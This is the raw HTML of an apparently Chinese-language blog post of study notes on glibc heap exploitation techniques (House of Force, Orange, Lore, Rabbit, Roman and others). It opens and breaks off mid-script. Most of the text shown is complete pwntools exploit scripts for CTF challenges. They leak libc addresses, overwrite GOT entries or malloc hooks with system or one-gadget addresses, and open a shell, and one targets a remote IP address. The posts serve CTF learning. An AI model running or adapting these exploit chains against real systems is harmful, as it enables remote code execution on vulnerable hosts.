class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">info=sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">libc.address=u64(info)-<span class="number">0x3ed8b0</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line">free_hook=libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x100</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(libc.address+ogg[<span class="number">1</span>]))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/11/wiki%E4%B8%8A%E7%9A%84house%E7%B3%BB%E5%88%97/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/11/wiki%E4%B8%8A%E7%9A%84house%E7%B3%BB%E5%88%97/" class="post-title-link" itemprop="url">wikiä¸Šçš„houseç³»åˆ—</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-01-11 16:11:44 / ä¿®æ”¹æ—¶é—´ï¼š16:13:30" itemprop="dateCreated datePublished" datetime="2022-01-11T16:11:44+08:00">2022-01-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="wikiä¸Šçš„houseç³»åˆ—"><a href="#wikiä¸Šçš„houseç³»åˆ—" class="headerlink" title="wikiä¸Šçš„houseç³»åˆ—"></a>wikiä¸Šçš„houseç³»åˆ—</h1><h2 id="House-Of-Einherjar"><a href="#House-Of-Einherjar" class="headerlink" title="House Of Einherjar"></a>House Of Einherjar</h2><p>æ€è·¯ï¼šä¸»è¦è¿˜æ˜¯åˆ©ç”¨unlink,å¦‚æœç¨‹åºå¯ä»¥ä¿®æ”¹prev_sizeå’Œprev_inuseï¼Œé‚£å‘ååˆå¹¶çš„æ—¶å€™å°±å¯ä»¥æŒ‡å‘åé¢ä»»æ„ä¸€ä¸ªå †äº†ã€‚ï¼ˆoverlapï¼‰</p>
<h2 id="House-Of-Force"><a href="#House-Of-Force" class="headerlink" title="House Of Force"></a>House Of Force</h2><p>æ€è·¯ï¼šåˆ©ç”¨top_chunkå®Œæˆä»»æ„åœ°å€ç”³è¯·ï¼Œå½“ç”³è¯·å †æ—¶ï¼Œå¦‚æœè¦ç”¨top_chunkæ—¶ï¼Œå°±ä¼šæ¯”è¾ƒç”³è¯·çš„å †å’Œtop_chunkçš„å¤§å°ï¼Œå¦‚æœå¤§äºçš„è¯å°±ä¼šåœ¨top_chunkä¸Šåˆ‡å‰²ä¸€å—ä¸‹æ¥ï¼Œå‡å¦‚å…ˆä¿®æ”¹top_chunkçš„sizeä¸º0xffffffffffffffff(æ¯”è¾ƒå¤§å°æ—¶åŒ–ä½œæ— ç¬¦å·æ•°ï¼Œå› æ­¤è¿™ä¸ªæ•°æ˜¯æœ€å¤§çš„)ï¼Œæˆ‘ä»¬å†ç”³è¯·ä¸€ä¸ªè´Ÿæ•°ï¼Œé‚£æœ€åtop_addr=åŸæ¥çš„top_chunkçš„åœ°å€å‡å»ç”³è¯·çš„æ•°ï¼Œåªè¦è®¡ç®—å¥½ç¡®å®šçš„offestï¼Œå°±å¯ä»¥æŠŠtop_chunkæŒªç§»åˆ°ä»»æ„åœ°å€ï¼Œç„¶åå†ç”³è¯·å‡ºæ¥å°±å¥½äº†ã€‚</p>
<h5 id="ä¾‹é¢˜ï¼šHITCON-training-lab-11"><a href="#ä¾‹é¢˜ï¼šHITCON-training-lab-11" class="headerlink" title="ä¾‹é¢˜ï¼šHITCON training lab 11"></a>ä¾‹é¢˜ï¼šHITCON training lab 11</h5><p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the name of item:&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,length,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the length of item name:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the new name of the item:&#x27;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Please enter the index of item:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#house of force</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x120</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x510</span>+<span class="number">0x110</span>+<span class="number">1</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;2 : &#x27;</span>)</span><br><span class="line">libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">88</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">edit(<span class="number">3</span>,<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">target_addr=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0xc0</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#7</span></span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">show()</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;2 : &#x27;</span>)</span><br><span class="line">top_addr=u64(sh.recv(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))+<span class="number">0x80</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(top_addr)</span><br><span class="line">atoi_addr=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">offset=atoi_addr-top_addr-<span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(offset)</span><br><span class="line">add(offset,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="number">0x8</span>,p64(system))</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Your choice:&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h2><p>æ˜¯é’ˆå¯¹smallbinçš„æ”»å‡»ï¼Œæ„Ÿè§‰è¿™ä¸ªæŒºå¥½ç”¨çš„ï¼Œä»¥åå¯ä»¥å¤šè¯•è¯•</p>
<p>æ€è·¯ï¼šå½“éœ€è¦ä»smallbinä¸Šé¢è„±æ‰æœ€åä¸€ä¸ªé“¾æ—¶ï¼Œéœ€è¦å€’æ•°ç¬¬äºŒä¸ªé“¾å’Œbinè¿›è¡Œé“¾è¡¨å¤„ç†ï¼Œä¼šæ‰§è¡Œä»¥ä¸‹ä»£ç </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// è·å– small <span class="built_in">bin</span> ä¸­å€’æ•°ç¬¬äºŒä¸ª chunk ã€‚</span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line">// æ£€æŸ¥ bck-&gt;fd æ˜¯ä¸æ˜¯ victimï¼Œé˜²æ­¢ä¼ªé€ </span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    goto errout;</span><br><span class="line">&#125;</span><br><span class="line">// è®¾ç½® victim å¯¹åº”çš„ inuse ä½</span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">// ä¿®æ”¹ small <span class="built_in">bin</span> é“¾è¡¨ï¼Œå°† small <span class="built_in">bin</span> çš„æœ€åä¸€ä¸ª chunk å–å‡ºæ¥</span><br><span class="line"><span class="built_in">bin</span>-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = <span class="built_in">bin</span>;</span><br></pre></td></tr></table></figure>

<p>å¯è§ï¼Œä¸»è¦æ§åˆ¶bk,ç„¶åä¼ªé€ ä¸€ä¸ªchunké€šè¿‡bck-&gt;fd != victimåˆ¤æ–­ï¼Œå°±å¯ä»¥è®©ä¸€ä¸ªä¼ªé€ çš„chunkè¿›å…¥smallbin</p>
<p>æ„Ÿè§‰å½“æ²¡å¼€å¯pieçš„æ—¶å€™å¯ä»¥å®Œæˆå †åˆ°bssçš„ç”³è¯·ã€‚</p>
<h2 id="House-of-Orange"><a href="#House-of-Orange" class="headerlink" title="House of Orange"></a>House of Orange</h2><p>æ€è·¯ï¼šå½“ç”³è¯·çš„å †çš„å¤§å°å¤§äºtop_chunkæ—¶ï¼Œtop_chunkå°±ä¼šè¢«freeæ‰è¿›å…¥bin,å½“ç¨‹åºæ²¡æœ‰freeåŠŸèƒ½æ—¶å¯ä»¥åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å®Œæˆfree_chunkï¼Œä½†ä¸€èˆ¬ç¨‹åºä¼šå¯¹ç”³è¯·å¤§å°åšé™åˆ¶ï¼Œä¸ä¼šè¶…è¿‡top_chunk_sizeï¼Œæ‰€ä»¥è¦é€šè¿‡æº¢å‡ºä¿®æ”¹top_chunkå¤§å°ï¼Œä¸è¿‡ä¹Ÿä¸èƒ½éšä¾¿ä¿®æ”¹ï¼Œå¾—è®©top_chunk_size+top_chunk_addræ˜¯0x1000çš„æ•´æ•°å€æ‰è¡Œã€‚</p>
<p>ä¾‹é¢˜ï¼šductfä¸Šçš„pwn1çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./main&#x27;)</span></span><br><span class="line">sh=remote(<span class="string">&#x27;47.106.172.144&#x27;</span>,<span class="number">65001</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(sh,&#x27;b main&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">elf =ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">ogg=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">count</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;List count: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(count))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_item</span>(<span class="params">list_id,item_id</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;List id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(list_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Item id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(item_id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite</span>(<span class="params">list_id,star_id,end_id,number</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;List id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(list_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Star id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(star_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;End id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(end_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;New number: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(number))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">list_id,item_id,number</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;List id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(list_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Item id: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(item_id))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;New number: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(number))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">23</span>)</span><br><span class="line">overwrite(<span class="number">0</span>,<span class="number">23</span>,<span class="number">23</span>,<span class="number">0x1311</span>)</span><br><span class="line">add(<span class="number">0x1400</span>)</span><br><span class="line">add(<span class="number">23</span>)</span><br><span class="line">overwrite(<span class="number">0</span>,<span class="number">29</span>,<span class="number">29</span>,<span class="number">0x50000000</span>)</span><br><span class="line">show_item(<span class="number">2</span>,<span class="number">24</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(sh.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;: &#x27;</span>)[<span class="number">1</span>])-libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">88</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc.address)</span><br><span class="line">system=libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">atoi_got=elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(atoi_got)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system)</span><br><span class="line">overwrite(<span class="number">0</span>,<span class="number">24</span>,<span class="number">24</span>,atoi_got)</span><br><span class="line">overwrite(<span class="number">0</span>,<span class="number">25</span>,<span class="number">25</span>,<span class="number">0x50000000</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0</span>,system)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="House-of-Rabbit"><a href="#House-of-Rabbit" class="headerlink" title="House of Rabbit"></a>House of Rabbit</h2><p>ä»¥å‰æ‰“æ¯”èµ›é‡è§è¿‡</p>
<p>æ€è·¯ï¼šåˆ©ç”¨çš„æ˜¯fastbinçš„ malloc consolidateï¼Œå½“ç”³è¯·çš„å †å—çš„å¤§å°å¤§äºfasbinçš„æœ€å¤§å€¼çš„æ—¶å€™å°±ä¼šè§¦å‘malloc_consolidat,å¦‚æœæ²¡æœ‰ä½¿ç”¨çš„è¯å°±ä¼šæŠŠç›¸é‚»çš„å †å—è¿›è¡Œåˆå¹¶ï¼Œç„¶åæ”¾åˆ°smallbinä¸Šé¢ï¼Œåˆå¹¶å½“ç„¶æ˜¯ublinkï¼Œæ— éå°±æ˜¯åˆ©ç”¨prev_sizeå’Œè‡ªèº«çš„sizeæ¥å®Œæˆåˆå¹¶ï¼Œåªè¦ä¼ªé€ sizeå°±å¯ä»¥å®Œæˆåé¢çš„ä»»æ„å †åˆå¹¶äº†ã€‚</p>
<p>æ­£å¸¸å †å—</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220111154212459.png" alt="image-20220111154212459"></p>
<p>å®Œæˆä¼ªé€ å</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220111154245300.png" alt="image-20220111154245300"></p>
<p>ç„¶åå†ç”³è¯·ä¸€ä¸ªå¤§å †ï¼Œå°±å®Œæˆchunk2å’Œchunk4çš„åˆå¹¶äº†ï¼Œå®Œæˆoverlap</p>
<p>malloc_consolidatä¸ä»…å¯ä»¥ç”¨æ¥å®Œæˆoverlapï¼Œå½“èƒ½ç”³è¯·çš„å †å¾ˆå°çš„æ—¶å€™ï¼Œè¿˜å¯ä»¥é€šè¿‡ä»–æŠŠå°å †åˆå¹¶æ”¾åˆ°smallbinä¸Šé¢è¾¾åˆ°leakå‡ºlibcåœ°å€</p>
<h2 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h2><p>ä¸»è¦ç”¨é€”ï¼Œå½“æ²¡æœ‰leakå‡½æ•°æ—¶é€šè¿‡çˆ†ç ´æ¥å®Œæˆgetshell(æ„Ÿè§‰è¦çœ‹è„¸)</p>
<p>å‰æƒ…æè¦ï¼šå½“ä¸€ä¸ªç¨‹åºå¼€å¯pieæ—¶è™½ç„¶åŸºåœ°å€æ˜¯éšæœºçš„ï¼ˆä½†éšæœºçš„å¾ˆæœ‰é™ï¼‰ï¼Œç”±äºæ˜¯åˆ†é¡µç®¡ç†ï¼Œæ‰€ä»¥åŸºåœ°å€çš„æœ€ååäºŒä½æ˜¯0ï¼Œå…·ä½“åˆ°æŸä¸€ä¸ªä»£ç çš„åœ°å€å°±æ˜¯åŸºåœ°å€åŠ ä¸Šè¿™ä¸ªä»£ç çš„åç§»é‡ï¼Œå¦‚æœä¸¤ä¸ªä»£ç çš„åœ°å€ä¸è¶…è¿‡0xfffï¼ˆå½“ç„¶è¶…è¿‡ä¹Ÿè¡Œï¼Œåˆ«å¤ªå¤§å°±è¡Œï¼‰,å°±å¯ä»¥é€šè¿‡ä¿®æ”¹æœ€ååäºŒä½æ¥è®©è¿™ä¸ªåœ°å€æŒ‡å‘å¦ä¸€ä¸ªä»£ç ï¼Œä½†æ˜¯ä¿®æ”¹æ•°æ®æ˜¯8ä¸ªå­—èŠ‚8ä¸ªå­—èŠ‚ä¿®æ”¹ï¼Œç¬¬åäºŒä½åˆ°ç¬¬åå…­ä½ä¸æ¸…æ¥šï¼Œåªèƒ½é‡‡ç”¨çˆ†ç ´çš„æ–¹æ³•æ¥çŒœæ­£ç¡®åœ°å€ï¼Œè¿™ä¸ªæ”»å‡»æ‰‹æ³•å°±åˆ©ç”¨è¿™ä¸ªæ€è·¯ã€‚</p>
<p>æ€è·¯ï¼šunsortedbinä¸Šé¢libcåœ°å€å’Œmalloc_hookåœ°å€å¾ˆæ¥è¿‘ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´æŠŠè¿™ä¸ªåœ°å€æ”¹æˆmalloc_hookï¼Œç„¶åæŠŠè¿™ä¸ªå †åˆ†é…åˆ°fasbinä¸Šé¢ï¼Œç”³è¯·åˆ°mallo_hooké™„è¿‘çš„ç©ºé—´ï¼Œç„¶åé€šè¿‡unsortedbin_attackæŠŠmalloc_hookå†™ä¸Šlibcçš„åœ°å€ï¼Œç„¶åå†é€šè¿‡çˆ†ç ´çš„æ–¹æ³•æŠŠè¿™ä¸ªåœ°å€æ”¹æˆoggï¼Œç„¶åè§¦å‘malloc_hook(ç”³è¯·æˆ–è€…doublefree)å®ŒæˆgetShell,è¿™é‡Œå¸–ä¸€ä¸ªåˆ«äººæ¢³ç†çš„å…·ä½“æ­¥éª¤</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220111160730455.png" alt="image-20220111160730455"></p>
<p>ä¾‹é¢˜ new_chall</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ogg=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span 